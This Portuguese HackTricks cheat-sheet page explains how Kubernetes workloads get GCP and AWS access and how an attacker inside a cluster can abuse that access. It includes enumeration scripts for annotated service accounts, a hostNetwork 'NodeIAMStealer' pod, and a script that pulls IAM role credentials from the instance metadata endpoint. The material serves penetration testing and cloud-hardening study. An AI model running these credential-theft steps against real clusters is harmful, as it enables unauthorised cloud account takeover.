# Kubernetes Pivoting para Nuvens

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## GCP

Se voc√™ estiver executando um cluster k8s dentro do GCP, provavelmente desejar√° que alguma aplica√ß√£o em execu√ß√£o dentro do cluster tenha acesso ao GCP. Existem 2 maneiras comuns de fazer isso:

### Montando chaves GCP-SA como segredo

Uma maneira comum de dar **acesso a uma aplica√ß√£o Kubernetes ao GCP** √©:

* Criar uma Conta de Servi√ßo do GCP
* Vincular a ela as permiss√µes desejadas
* Baixar uma chave json da SA criada
* Mont√°-la como um segredo dentro do pod
* Definir a vari√°vel de ambiente GOOGLE\_APPLICATION\_CREDENTIALS apontando para o caminho onde o json est√°.

{% hint style="warning" %}
Portanto, como um **atacante**, se voc√™ comprometer um cont√™iner dentro de um pod, verifique essa **vari√°vel de ambiente** e **arquivos json** com credenciais do GCP.
{% endhint %}

### Relacionando o json do GSA ao segredo do KSA

Uma maneira de dar acesso a um GSA a um cluster GKE √© vincul√°-los da seguinte maneira:

* Crie uma conta de servi√ßo do Kubernetes no mesmo namespace do seu cluster GKE usando o seguinte comando:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* Crie um Segredo do Kubernetes que contenha as credenciais da conta de servi√ßo do GCP √† qual voc√™ deseja conceder acesso ao cluster GKE. Voc√™ pode fazer isso usando a ferramenta de linha de comando `gcloud`, conforme mostrado no exemplo a seguir:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Vincule o Segredo do Kubernetes √† conta de servi√ßo do Kubernetes usando o seguinte comando:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
No **segundo passo**, as **credenciais do GSA foram definidas como segredo do KSA**. Ent√£o, se voc√™ puder **ler esse segredo** de **dentro** do cluster **GKE**, voc√™ pode **elevar para essa conta de servi√ßo do GCP**.
{% endhint %}

### Identidade de Carga de Trabalho do GKE

Com a Identidade de Carga de Trabalho, podemos configurar uma [conta de servi√ßo do Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) para agir como uma [conta de servi√ßo do Google](https://cloud.google.com/iam/docs/understanding-service-accounts). Os pods em execu√ß√£o com a conta de servi√ßo do Kubernetes ser√£o autenticados automaticamente como a conta de servi√ßo do Google ao acessar as APIs do Google Cloud.

A **primeira s√©rie de etapas** para habilitar esse comportamento √© **habilitar a Identidade de Carga de Trabalho no GCP** ([**etapas**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) e criar a conta de servi√ßo do GCP que voc√™ deseja que o k8s se fa√ßa passar.

* **Habilitar a Identidade de Carga de Trabalho** em um novo cluster

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
* **Criar/Atualizar um novo nodepool** (clusters do Autopilot n√£o precisam disso)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Crie a **Conta de Servi√ßo GCP para se passar por** a partir do K8s com permiss√µes GCP:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Conecte-se** ao **cluster** e **crie** a **conta de servi√ßo** a ser usada

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Vincule o GSA com o KSA**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* Execute um **pod** com o **KSA** e verifique o **acesso** ao **GSA**:
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
Verifique o seguinte comando para autenticar, caso necess√°rio:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
Como um invasor dentro do K8s, voc√™ deve **procurar por SAs** com a **anota√ß√£o `iam.gke.io/gcp-service-account`**, pois isso indica que o SA pode acessar algo no GCP. Outra op√ß√£o seria tentar abusar de cada KSA no cluster e verificar se ele tem acesso.\
Do GCP, √© sempre interessante enumerar as associa√ß√µes e saber **a qual acesso voc√™ est√° dando para os SAs dentro do Kubernetes**.
{% endhint %}

Este √© um script para **iterar facilmente sobre todas as defini√ß√µes de pods** procurando por essa **anota√ß√£o**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (Fun√ß√£o IAM para Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Uma maneira (desatualizada) de fornecer Fun√ß√µes IAM para Pods √© usar um servidor [**Kiam**](https://github.com/uswitch/kiam) ou [**Kube2IAM**](https://github.com/jtblin/kube2iam). Basicamente, voc√™ precisar√° executar um **daemonset** em seu cluster com um **tipo de fun√ß√£o IAM privilegiada**. Este daemonset ser√° respons√°vel por fornecer acesso √†s fun√ß√µes IAM aos pods que precisam delas.

Antes de tudo, voc√™ precisa configurar **quais fun√ß√µes podem ser acessadas dentro do namespace**, e voc√™ faz isso com uma anota√ß√£o dentro do objeto namespace:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

Uma vez que o namespace esteja configurado com as fun√ß√µes IAM que os Pods podem ter, voc√™ pode **indicar a fun√ß√£o desejada em cada defini√ß√£o de pod com algo como**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
Como um invasor, se voc√™ **encontrar essas anota√ß√µes** em pods ou namespaces ou um servidor kiam/kube2iam em execu√ß√£o (provavelmente em kube-system), voc√™ pode **se passar por qualquer fun√ß√£o** que j√° √© **usada por pods** e mais (se tiver acesso √† conta AWS, enumere as fun√ß√µes).
{% endhint %}

#### Criar Pod com Fun√ß√£o IAM

{% hint style="info" %}
A fun√ß√£o IAM a ser indicada deve estar na mesma conta AWS que a fun√ß√£o kiam/kube2iam e essa fun√ß√£o deve ter acesso a ela.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Role para Contas de Servi√ßo do K8s via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Este √© o **m√©todo recomendado pela AWS**.

1. Primeiro, voc√™ precisa [criar um provedor OIDC para o cluster](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Em seguida, crie uma fun√ß√£o IAM com as permiss√µes necess√°rias para a conta de servi√ßo.
3. Crie uma [rela√ß√£o de confian√ßa entre a fun√ß√£o IAM e a conta de servi√ßo](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) nome (ou os namespaces que concedem acesso √† fun√ß√£o para todas as contas de servi√ßo do namespace). _A rela√ß√£o de confian√ßa verificar√° principalmente o nome do provedor OIDC, o nome do namespace e o nome da conta de servi√ßo_.
4. Por fim, **crie uma conta de servi√ßo com uma anota√ß√£o indicando o ARN da fun√ß√£o**, e os pods em execu√ß√£o com essa conta de servi√ßo ter√£o **acesso ao token da fun√ß√£o**. O **token** √© **escrito** em um arquivo e o caminho √© especificado em **`AWS_WEB_IDENTITY_TOKEN_FILE`** (padr√£o: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Para **obter o aws usando o token** de `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`, execute:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
Como atacante, se voc√™ puder enumerar um cluster K8s, verifique se existem **contas de servi√ßo com essa anota√ß√£o** para **elevar para a AWS**. Para fazer isso, basta **executar/criar** um **pod** usando uma das **contas de servi√ßo privilegiadas do IAM** e roubar o token.

Al√©m disso, se voc√™ estiver dentro de um pod, verifique as vari√°veis de ambiente como **AWS\_ROLE\_ARN** e **AWS\_WEB\_IDENTITY\_TOKEN**.
{% endhint %}

{% hint style="danger" %}
√Äs vezes, a **Pol√≠tica de Confian√ßa de uma fun√ß√£o** pode estar **mal configurada** e, em vez de conceder acesso AssumeRole √† conta de servi√ßo esperada, ela concede acesso a **todas as contas de servi√ßo**. Portanto, se voc√™ for capaz de escrever uma anota√ß√£o em uma conta de servi√ßo controlada, poder√° acessar a fun√ß√£o.

Verifique a **p√°gina a seguir para obter mais informa√ß√µes**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Encontrar Pods e SAs com Fun√ß√µes IAM no Cluster

Este √© um script para **iterar facilmente sobre todos os pods e defini√ß√µes de sas** procurando por aquela **anota√ß√£o**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Fun√ß√£o IAM do Node

A se√ß√£o anterior tratava de como roubar Fun√ß√µes IAM com pods, mas observe que um **Node do** cluster K8s ser√° uma **inst√¢ncia dentro da nuvem**. Isso significa que √© altamente prov√°vel que o Node tenha uma **nova fun√ß√£o IAM que voc√™ pode roubar** (_observe que geralmente todos os n√≥s de um cluster K8s ter√£o a mesma fun√ß√£o IAM, ent√£o pode n√£o valer a pena verificar cada n√≥_).

No entanto, h√° um requisito importante para acessar o endpoint de metadados do n√≥, voc√™ precisa estar no n√≥ (sess√£o ssh?) ou pelo menos ter a mesma rede:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### Roubar Token de Fun√ß√£o IAM

Anteriormente, discutimos como **anexar Fun√ß√µes IAM a Pods** ou at√© mesmo como **escapar para o Node para roubar a Fun√ß√£o IAM** que a inst√¢ncia tem anexada a ela.

Voc√™ pode usar o seguinte script para **roubar** as suas novas e trabalhadas **credenciais de fun√ß√£o IAM**:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## Refer√™ncias

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
